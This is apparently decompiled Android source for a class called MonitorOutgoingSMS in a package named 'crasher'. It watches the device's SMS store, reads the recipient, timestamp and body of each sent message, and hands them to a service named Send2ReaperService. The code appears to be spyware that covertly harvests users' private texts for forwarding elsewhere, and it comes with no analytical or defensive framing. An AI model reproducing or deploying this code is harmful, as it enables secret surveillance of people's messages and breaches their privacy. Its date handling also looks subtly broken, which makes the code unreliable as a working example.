package com.bigeye.crasher;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;
import java.sql.Date;
/* loaded from: classes.dex */
public class MonitorOutgoingSMS extends Activity {
    public String APP_TAG = "OutgoingSMSService";
    ContentResolver contentResolver;
    ContentObserver smsContentObserver;

    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_crasher);
        this.contentResolver = getContentResolver();
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        this.smsContentObserver = new ContentObserver(new Handler()) { // from class: com.bigeye.crasher.MonitorOutgoingSMS.1
            @Override // android.database.ContentObserver
            public void onChange(boolean selfChange) {
                Uri smsURI = Uri.parse("content://sms/sent");
                Cursor c = MonitorOutgoingSMS.this.getContentResolver().query(smsURI, new String[]{"address", "date_sent", "body"}, null, null, null);
                String[] columns = {"address", "date_sent", "body"};
                c.moveToNext();
                String dest = c.getString(c.getColumnIndex(columns[0]));
                String date = c.getString(c.getColumnIndex(columns[1]));
                String smsContent = c.getString(c.getColumnIndex(columns[2]));
                String finalText = "sms to :" + dest + ": " + smsContent + ": " + new Date(Integer.getInteger(date).intValue()).toLocaleString();
                Toast.makeText(MonitorOutgoingSMS.this.getApplicationContext(), finalText, 1).show();
                Log.i(MonitorOutgoingSMS.this.APP_TAG, finalText);
                Intent SvcIntent = new Intent(MonitorOutgoingSMS.this.getApplicationContext(), Send2ReaperService.class);
                SvcIntent.putExtra("OPERATION", "OUTGOING");
                SvcIntent.putExtra("MSG", finalText);
                MonitorOutgoingSMS.this.startService(SvcIntent);
            }

            @Override // android.database.ContentObserver
            public boolean deliverSelfNotifications() {
                return true;
            }
        };
        this.contentResolver.registerContentObserver(Uri.parse("content://sms"), true, this.smsContentObserver);
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        this.contentResolver.unregisterContentObserver(this.smsContentObserver);
    }
}
